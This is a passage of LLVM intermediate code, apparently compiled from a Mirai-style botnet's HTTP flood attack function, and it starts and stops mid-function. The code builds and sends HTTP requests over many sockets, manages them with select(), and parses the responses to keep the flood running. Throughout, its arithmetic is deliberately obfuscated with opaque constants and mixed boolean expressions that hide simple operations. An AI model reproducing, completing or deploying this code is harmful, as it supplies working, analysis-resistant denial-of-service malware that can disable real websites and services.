  %864 = sub i32 %862, %863
  %865 = add nsw i32 %862, 1
  store i32 %864, i32* %10, align 4
  br label %836

; <label>:866:                                    ; preds = %836
  %867 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %868 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %869 = call i32 @util_strlen(i8* %868)
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds i8, i8* %867, i64 %870
  %872 = call i32 @util_strcpy(i8* %871, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %873

; <label>:873:                                    ; preds = %866, %824
  %874 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %875 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %876 = call i32 @util_strlen(i8* %875)
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds i8, i8* %874, i64 %877
  %879 = call i32 @util_strcpy(i8* %878, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %880 = load i8*, i8** %14, align 8
  %881 = icmp ne i8* %880, null
  br i1 %881, label %882, label %890

; <label>:882:                                    ; preds = %873
  %883 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %884 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %885 = call i32 @util_strlen(i8* %884)
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds i8, i8* %883, i64 %886
  %888 = load i8*, i8** %14, align 8
  %889 = call i32 @util_strcpy(i8* %887, i8* %888)
  br label %890

; <label>:890:                                    ; preds = %882, %873
  %891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %891, i32 0, i32 9
  %893 = getelementptr inbounds [9 x i8], [9 x i8]* %892, i32 0, i32 0
  %894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %894, i32 0, i32 10
  %896 = getelementptr inbounds [9 x i8], [9 x i8]* %895, i32 0, i32 0
  %897 = call signext i8 @util_strcmp(i8* %893, i8* %896)
  %898 = icmp ne i8 %897, 0
  br i1 %898, label %907, label %899

; <label>:899:                                    ; preds = %890
  %900 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %901 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %900, i32 0, i32 9
  %902 = getelementptr inbounds [9 x i8], [9 x i8]* %901, i32 0, i32 0
  %903 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %904 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %903, i32 0, i32 10
  %905 = getelementptr inbounds [9 x i8], [9 x i8]* %904, i32 0, i32 0
  %906 = call i32 @util_strcpy(i8* %902, i8* %905)
  br label %907

; <label>:907:                                    ; preds = %899, %890
  %908 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %909 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %908, i32 0, i32 0
  %910 = load i32, i32* %909, align 4
  %911 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %912 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %913 = call i32 @util_strlen(i8* %912)
  %914 = sext i32 %913 to i64
  %915 = call i64 @send(i32 %910, i8* %911, i64 %914, i32 16384)
  %916 = load i32, i32* %27, align 4
  %917 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %918 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %917, i32 0, i32 3
  store i32 %916, i32* %918, align 4
  %919 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %920 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %919, i32 0, i32 1
  store i8 6, i8* %920, align 4
  %921 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %922 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %921, i32 0, i32 0
  %923 = load i32, i32* %922, align 4
  %924 = srem i32 %923, 64
  %925 = zext i32 %924 to i64
  %926 = shl i64 1, %925
  %927 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %928 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %929 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %928, i32 0, i32 0
  %930 = load i32, i32* %929, align 4
  %931 = sdiv i32 %930, 64
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds [16 x i64], [16 x i64]* %927, i64 0, i64 %932
  %934 = load i64, i64* %933, align 8
  %935 = xor i64 %934, -1
  %936 = xor i64 %926, -1
  %937 = xor i64 3189631583142955713, -1
  %938 = and i64 %935, 3189631583142955713
  %939 = and i64 %934, %937
  %940 = and i64 %936, 3189631583142955713
  %941 = and i64 %926, %937
  %942 = or i64 %938, %939
  %943 = or i64 %940, %941
  %944 = xor i64 %942, %943
  %945 = or i64 %935, %936
  %946 = xor i64 %945, -1
  %947 = or i64 3189631583142955713, %937
  %948 = and i64 %946, %947
  %949 = or i64 %944, %948
  %950 = or i64 %934, %926
  store i64 %949, i64* %933, align 8
  %951 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %952 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %951, i32 0, i32 0
  %953 = load i32, i32* %952, align 4
  %954 = load i32, i32* %23, align 4
  %955 = icmp sgt i32 %953, %954
  br i1 %955, label %956, label %964

; <label>:956:                                    ; preds = %907
  %957 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %957, i32 0, i32 0
  %959 = load i32, i32* %958, align 4
  %960 = add i32 %959, 1743802497
  %961 = add i32 %960, 1
  %962 = sub i32 %961, 1743802497
  %963 = add nsw i32 %959, 1
  store i32 %962, i32* %23, align 4
  br label %964

; <label>:964:                                    ; preds = %956, %907
  br label %1134

; <label>:965:                                    ; preds = %665
  %966 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %967 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %966, i32 0, i32 1
  %968 = load i8, i8* %967, align 4
  %969 = zext i8 %968 to i32
  %970 = icmp eq i32 %969, 6
  br i1 %970, label %971, label %1004

; <label>:971:                                    ; preds = %965
  %972 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %973 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 4
  %975 = srem i32 %974, 64
  %976 = zext i32 %975 to i64
  %977 = shl i64 1, %976
  %978 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %980 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 4
  %982 = sdiv i32 %981, 64
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds [16 x i64], [16 x i64]* %978, i64 0, i64 %983
  %985 = load i64, i64* %984, align 8
  %986 = and i64 %985, %977
  %987 = xor i64 %985, %977
  %988 = or i64 %986, %987
  %989 = or i64 %985, %977
  store i64 %988, i64* %984, align 8
  %990 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %990, i32 0, i32 0
  %992 = load i32, i32* %991, align 4
  %993 = load i32, i32* %23, align 4
  %994 = icmp sgt i32 %992, %993
  br i1 %994, label %995, label %1003

; <label>:995:                                    ; preds = %971
  %996 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %997 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %996, i32 0, i32 0
  %998 = load i32, i32* %997, align 4
  %999 = sub i32 %998, -21130101
  %1000 = add i32 %999, 1
  %1001 = add i32 %1000, -21130101
  %1002 = add nsw i32 %998, 1
  store i32 %1001, i32* %23, align 4
  br label %1003

; <label>:1003:                                   ; preds = %995, %971
  br label %1133

; <label>:1004:                                   ; preds = %965
  %1005 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1006 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1005, i32 0, i32 1
  %1007 = load i8, i8* %1006, align 4
  %1008 = zext i8 %1007 to i32
  %1009 = icmp eq i32 %1008, 7
  br i1 %1009, label %1010, label %1055

; <label>:1010:                                   ; preds = %1004
  %1011 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1011, i32 0, i32 0
  %1013 = load i32, i32* %1012, align 4
  %1014 = srem i32 %1013, 64
  %1015 = zext i32 %1014 to i64
  %1016 = shl i64 1, %1015
  %1017 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1018 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1019 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 4
  %1021 = sdiv i32 %1020, 64
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds [16 x i64], [16 x i64]* %1017, i64 0, i64 %1022
  %1024 = load i64, i64* %1023, align 8
  %1025 = xor i64 %1024, -1
  %1026 = xor i64 %1016, -1
  %1027 = xor i64 8181716167857809938, -1
  %1028 = and i64 %1025, 8181716167857809938
  %1029 = and i64 %1024, %1027
  %1030 = and i64 %1026, 8181716167857809938
  %1031 = and i64 %1016, %1027
  %1032 = or i64 %1028, %1029
  %1033 = or i64 %1030, %1031
  %1034 = xor i64 %1032, %1033
  %1035 = or i64 %1025, %1026
  %1036 = xor i64 %1035, -1
  %1037 = or i64 8181716167857809938, %1027
  %1038 = and i64 %1036, %1037
  %1039 = or i64 %1034, %1038
  %1040 = or i64 %1024, %1016
  store i64 %1039, i64* %1023, align 8
  %1041 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1042 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1041, i32 0, i32 0
  %1043 = load i32, i32* %1042, align 4
  %1044 = load i32, i32* %23, align 4
  %1045 = icmp sgt i32 %1043, %1044
  br i1 %1045, label %1046, label %1054

; <label>:1046:                                   ; preds = %1010
  %1047 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1048 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1047, i32 0, i32 0
  %1049 = load i32, i32* %1048, align 4
  %1050 = sub i32 %1049, 227585851
  %1051 = add i32 %1050, 1
  %1052 = add i32 %1051, 227585851
  %1053 = add nsw i32 %1049, 1
  store i32 %1052, i32* %23, align 4
  br label %1054

; <label>:1054:                                   ; preds = %1046, %1010
  br label %1132

; <label>:1055:                                   ; preds = %1004
  %1056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1056, i32 0, i32 1
  %1058 = load i8, i8* %1057, align 4
  %1059 = zext i8 %1058 to i32
  %1060 = icmp eq i32 %1059, 10
  br i1 %1060, label %1061, label %1106

; <label>:1061:                                   ; preds = %1055
  %1062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1062, i32 0, i32 0
  %1064 = load i32, i32* %1063, align 4
  %1065 = srem i32 %1064, 64
  %1066 = zext i32 %1065 to i64
  %1067 = shl i64 1, %1066
  %1068 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1069 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1070 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1069, i32 0, i32 0
  %1071 = load i32, i32* %1070, align 4
  %1072 = sdiv i32 %1071, 64
  %1073 = sext i32 %1072 to i64
  %1074 = getelementptr inbounds [16 x i64], [16 x i64]* %1068, i64 0, i64 %1073
  %1075 = load i64, i64* %1074, align 8
  %1076 = xor i64 %1075, -1
  %1077 = xor i64 %1067, -1
  %1078 = xor i64 -1747973942868543113, -1
  %1079 = and i64 %1076, -1747973942868543113
  %1080 = and i64 %1075, %1078
  %1081 = and i64 %1077, -1747973942868543113
  %1082 = and i64 %1067, %1078
  %1083 = or i64 %1079, %1080
  %1084 = or i64 %1081, %1082
  %1085 = xor i64 %1083, %1084
  %1086 = or i64 %1076, %1077
  %1087 = xor i64 %1086, -1
  %1088 = or i64 -1747973942868543113, %1078
  %1089 = and i64 %1087, %1088
  %1090 = or i64 %1085, %1089
  %1091 = or i64 %1075, %1067
  store i64 %1090, i64* %1074, align 8
  %1092 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1093 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1092, i32 0, i32 0
  %1094 = load i32, i32* %1093, align 4
  %1095 = load i32, i32* %23, align 4
  %1096 = icmp sgt i32 %1094, %1095
  br i1 %1096, label %1097, label %1105

; <label>:1097:                                   ; preds = %1061
  %1098 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1099 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1098, i32 0, i32 0
  %1100 = load i32, i32* %1099, align 4
  %1101 = sub i32 %1100, -1032626307
  %1102 = add i32 %1101, 1
  %1103 = add i32 %1102, -1032626307
  %1104 = add nsw i32 %1100, 1
  store i32 %1103, i32* %23, align 4
  br label %1105

; <label>:1105:                                   ; preds = %1097, %1061
  br label %1131

; <label>:1106:                                   ; preds = %1055
  %1107 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1108 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1107, i32 0, i32 1
  %1109 = load i8, i8* %1108, align 4
  %1110 = zext i8 %1109 to i32
  %1111 = icmp eq i32 %1110, 11
  br i1 %1111, label %1112, label %1121

; <label>:1112:                                   ; preds = %1106
  %1113 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1114 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1113, i32 0, i32 1
  store i8 0, i8* %1114, align 4
  %1115 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1116 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1115, i32 0, i32 0
  %1117 = load i32, i32* %1116, align 4
  %1118 = call i32 @close(i32 %1117)
  %1119 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1120 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1119, i32 0, i32 0
  store i32 -1, i32* %1120, align 4
  br label %1130

; <label>:1121:                                   ; preds = %1106
  %1122 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1123 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1122, i32 0, i32 1
  store i8 0, i8* %1123, align 4
  %1124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1124, i32 0, i32 0
  %1126 = load i32, i32* %1125, align 4
  %1127 = call i32 @close(i32 %1126)
  %1128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1128, i32 0, i32 0
  store i32 -1, i32* %1129, align 4
  br label %1130

; <label>:1130:                                   ; preds = %1121, %1112
  br label %1131

; <label>:1131:                                   ; preds = %1130, %1105
  br label %1132

; <label>:1132:                                   ; preds = %1131, %1054
  br label %1133

; <label>:1133:                                   ; preds = %1132, %1003
  br label %1134

; <label>:1134:                                   ; preds = %1133, %964
  br label %1135

; <label>:1135:                                   ; preds = %1134, %664
  br label %1136

; <label>:1136:                                   ; preds = %1135, %607
  br label %1137

; <label>:1137:                                   ; preds = %1136, %623, %522
  %1138 = load i32, i32* %9, align 4
  %1139 = sub i32 %1138, -955908138
  %1140 = add i32 %1139, 1
  %1141 = add i32 %1140, -955908138
  %1142 = add nsw i32 %1138, 1
  store i32 %1141, i32* %9, align 4
  br label %474

; <label>:1143:                                   ; preds = %474
  %1144 = load i32, i32* %23, align 4
  %1145 = icmp eq i32 %1144, 0
  br i1 %1145, label %1146, label %1147

; <label>:1146:                                   ; preds = %1143
  br label %451

; <label>:1147:                                   ; preds = %1143
  %1148 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1148, align 8
  %1149 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1149, align 8
  %1150 = load i32, i32* %23, align 4
  %1151 = call i32 @select(i32 %1150, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1151, i32* %24, align 4
  %1152 = call i64 @time(i64* null) #6
  %1153 = trunc i64 %1152 to i32
  store i32 %1153, i32* %27, align 4
  %1154 = load i32, i32* %24, align 4
  %1155 = icmp slt i32 %1154, 1
  br i1 %1155, label %1156, label %1157

; <label>:1156:                                   ; preds = %1147
  br label %451

; <label>:1157:                                   ; preds = %1147
  store i32 0, i32* %9, align 4
  br label %1158

; <label>:1158:                                   ; preds = %2891, %1157
  %1159 = load i32, i32* %9, align 4
  %1160 = load i32, i32* %18, align 4
  %1161 = icmp slt i32 %1159, %1160
  br i1 %1161, label %1162, label %2897

; <label>:1162:                                   ; preds = %1158
  %1163 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1164 = load i32, i32* %9, align 4
  %1165 = sext i32 %1164 to i64
  %1166 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1163, i64 %1165
  store %struct.attack_http_state* %1166, %struct.attack_http_state** %26, align 8
  %1167 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1167, i32 0, i32 0
  %1169 = load i32, i32* %1168, align 4
  %1170 = icmp eq i32 %1169, -1
  br i1 %1170, label %1171, label %1172

; <label>:1171:                                   ; preds = %1162
  br label %2891

; <label>:1172:                                   ; preds = %1162
  %1173 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1174 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 4
  %1177 = sdiv i32 %1176, 64
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds [16 x i64], [16 x i64]* %1173, i64 0, i64 %1178
  %1180 = load i64, i64* %1179, align 8
  %1181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1181, i32 0, i32 0
  %1183 = load i32, i32* %1182, align 4
  %1184 = srem i32 %1183, 64
  %1185 = zext i32 %1184 to i64
  %1186 = shl i64 1, %1185
  %1187 = xor i64 %1180, -1
  %1188 = xor i64 %1186, -1
  %1189 = xor i64 3391128397148322975, -1
  %1190 = or i64 %1187, %1188
  %1191 = or i64 3391128397148322975, %1189
  %1192 = xor i64 %1190, -1
  %1193 = and i64 %1192, %1191
  %1194 = and i64 %1180, %1186
  %1195 = icmp ne i64 %1193, 0
  br i1 %1195, label %1196, label %1220

; <label>:1196:                                   ; preds = %1172
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1197 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1198 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1197, i32 0, i32 0
  %1199 = load i32, i32* %1198, align 4
  %1200 = bitcast i32* %35 to i8*
  %1201 = call i32 @getsockopt(i32 %1199, i32 1, i32 4, i8* %1200, i32* %36) #6
  store i32 %1201, i32* %12, align 4
  %1202 = load i32, i32* %35, align 4
  %1203 = icmp eq i32 %1202, 0
  br i1 %1203, label %1204, label %1210

; <label>:1204:                                   ; preds = %1196
  %1205 = load i32, i32* %12, align 4
  %1206 = icmp eq i32 %1205, 0
  br i1 %1206, label %1207, label %1210

; <label>:1207:                                   ; preds = %1204
  %1208 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1209 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1208, i32 0, i32 1
  store i8 4, i8* %1209, align 4
  br label %1219

; <label>:1210:                                   ; preds = %1204, %1196
  %1211 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1211, i32 0, i32 0
  %1213 = load i32, i32* %1212, align 4
  %1214 = call i32 @close(i32 %1213)
  %1215 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1216 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1215, i32 0, i32 0
  store i32 -1, i32* %1216, align 4
  %1217 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1217, i32 0, i32 1
  store i8 0, i8* %1218, align 4
  br label %2891

; <label>:1219:                                   ; preds = %1207
  br label %1220

; <label>:1220:                                   ; preds = %1219, %1172
  %1221 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1222 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1222, i32 0, i32 0
  %1224 = load i32, i32* %1223, align 4
  %1225 = sdiv i32 %1224, 64
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds [16 x i64], [16 x i64]* %1221, i64 0, i64 %1226
  %1228 = load i64, i64* %1227, align 8
  %1229 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1230 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1229, i32 0, i32 0
  %1231 = load i32, i32* %1230, align 4
  %1232 = srem i32 %1231, 64
  %1233 = zext i32 %1232 to i64
  %1234 = shl i64 1, %1233
  %1235 = xor i64 %1228, -1
  %1236 = xor i64 %1234, -1
  %1237 = xor i64 -3967161583541031650, -1
  %1238 = or i64 %1235, %1236
  %1239 = or i64 -3967161583541031650, %1237
  %1240 = xor i64 %1238, -1
  %1241 = and i64 %1240, %1239
  %1242 = and i64 %1228, %1234
  %1243 = icmp ne i64 %1241, 0
  br i1 %1243, label %1244, label %2890

; <label>:1244:                                   ; preds = %1220
  %1245 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1245, i32 0, i32 1
  %1247 = load i8, i8* %1246, align 4
  %1248 = zext i8 %1247 to i32
  %1249 = icmp eq i32 %1248, 6
  br i1 %1249, label %1250, label %2403

; <label>:1250:                                   ; preds = %1244
  store i32 0, i32* %37, align 4
  %1251 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1251, i32 10240)
  %1252 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1253 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1252, i32 0, i32 0
  %1254 = load i32, i32* %1253, align 4
  %1255 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1256 = call i64 @recv(i32 %1254, i8* %1255, i64 10240, i32 16386)
  %1257 = trunc i64 %1256 to i32
  store i32 %1257, i32* %12, align 4
  %1258 = icmp slt i32 %1257, 1
  br i1 %1258, label %1259, label %1268

; <label>:1259:                                   ; preds = %1250
  %1260 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1261 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1260, i32 0, i32 0
  %1262 = load i32, i32* %1261, align 4
  %1263 = call i32 @close(i32 %1262)
  %1264 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1265 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1264, i32 0, i32 0
  store i32 -1, i32* %1265, align 4
  %1266 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1266, i32 0, i32 1
  store i8 0, i8* %1267, align 4
  br label %2891

; <label>:1268:                                   ; preds = %1250
  %1269 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1270 = load i32, i32* %12, align 4
  %1271 = call i32 @util_memsearch(i8* %1269, i32 %1270, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1272 = icmp eq i32 %1271, -1
  br i1 %1272, label %1273, label %1277

; <label>:1273:                                   ; preds = %1268
  %1274 = load i32, i32* %12, align 4
  %1275 = icmp slt i32 %1274, 10240
  br i1 %1275, label %1276, label %1277

; <label>:1276:                                   ; preds = %1273
  br label %2891

; <label>:1277:                                   ; preds = %1273, %1268
  %1278 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1279 = load i32, i32* %12, align 4
  %1280 = call i32 @util_memsearch(i8* %1278, i32 %1279, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1281 = sext i32 %1280 to i64
  %1282 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1281
  store i8 0, i8* %1282, align 1
  %1283 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1284 = load i32, i32* %12, align 4
  %1285 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1286 = call i32 @util_stristr(i8* %1283, i32 %1284, i8* %1285)
  %1287 = icmp ne i32 %1286, -1
  br i1 %1287, label %1288, label %1291

; <label>:1288:                                   ; preds = %1277
  %1289 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1290 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1289, i32 0, i32 11
  store i32 2, i32* %1290, align 4
  br label %1291

; <label>:1291:                                   ; preds = %1288, %1277
  %1292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1293 = load i32, i32* %12, align 4
  %1294 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1295 = call i32 @util_stristr(i8* %1292, i32 %1293, i8* %1294)
  %1296 = icmp ne i32 %1295, -1
  br i1 %1296, label %1297, label %1300

; <label>:1297:                                   ; preds = %1291
  %1298 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1298, i32 0, i32 11
  store i32 1, i32* %1299, align 4
  br label %1300

; <label>:1300:                                   ; preds = %1297, %1291
  %1301 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1301, i32 0, i32 12
  store i32 0, i32* %1302, align 4
  %1303 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1304 = load i32, i32* %12, align 4
  %1305 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1306 = call i32 @util_stristr(i8* %1303, i32 %1304, i8* %1305)
  %1307 = icmp ne i32 %1306, -1
  br i1 %1307, label %1308, label %1368

; <label>:1308:                                   ; preds = %1300
  %1309 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1310 = load i32, i32* %12, align 4
  %1311 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1312 = call i32 @util_stristr(i8* %1309, i32 %1310, i8* %1311)
  store i32 %1312, i32* %38, align 4
  %1313 = load i32, i32* %38, align 4
  %1314 = sext i32 %1313 to i64
  %1315 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1314
  %1316 = load i8, i8* %1315, align 1
  %1317 = sext i8 %1316 to i32
  %1318 = icmp eq i32 %1317, 32
  br i1 %1318, label %1319, label %1324

; <label>:1319:                                   ; preds = %1308
  %1320 = load i32, i32* %38, align 4
  %1321 = sub i32 0, 1
  %1322 = sub i32 %1320, %1321
  %1323 = add nsw i32 %1320, 1
  store i32 %1322, i32* %38, align 4
  br label %1324

; <label>:1324:                                   ; preds = %1319, %1308
  %1325 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1326 = load i32, i32* %38, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds i8, i8* %1325, i64 %1327
  %1329 = load i32, i32* %12, align 4
  %1330 = load i32, i32* %38, align 4
  %1331 = sub i32 0, %1330
  %1332 = add i32 %1329, %1331
  %1333 = sub nsw i32 %1329, %1330
  %1334 = call i32 @util_memsearch(i8* %1328, i32 %1332, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1334, i32* %39, align 4
  %1335 = load i32, i32* %39, align 4
  %1336 = icmp ne i32 %1335, -1
  br i1 %1336, label %1337, label %1367

; <label>:1337:                                   ; preds = %1324
  %1338 = load i32, i32* %38, align 4
  %1339 = sext i32 %1338 to i64
  %1340 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1339
  store i8* %1340, i8** %40, align 8
  %1341 = load i32, i32* %39, align 4
  %1342 = icmp sge i32 %1341, 2
  br i1 %1342, label %1343, label %1348

; <label>:1343:                                   ; preds = %1337
  %1344 = load i32, i32* %39, align 4
